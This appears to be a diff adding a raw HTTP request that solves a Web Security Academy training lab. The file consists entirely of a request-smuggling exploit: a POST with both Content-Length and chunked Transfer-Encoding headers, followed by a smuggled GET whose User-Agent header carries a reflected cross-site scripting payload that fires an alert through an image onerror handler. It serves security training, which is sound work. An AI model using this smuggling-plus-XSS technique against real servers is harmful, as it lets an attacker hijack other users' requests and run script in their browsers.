@@ -1,0 +1,18 @@
+POST /post?postId=4 HTTP/1.1
+Host: ac421faf1e8c15d780b36b78002b006c.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://ac421faf1e8c15d780b36b78002b006c.web-security-academy.net/
+Connection: keep-alive
+Cookie: session=mhj6ZclqtenHIj3I6L976utSLtSGQcom
+Upgrade-Insecure-Requests: 1
+Content-Length: 143
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=4 HTTP/1.1
+Host: ac421faf1e8c15d780b36b78002b006c.web-security-academy.net
+User-Agent: "/><img src=1 onerror='alert(1)'> 			# Stop using <script>alert(1)</script>!
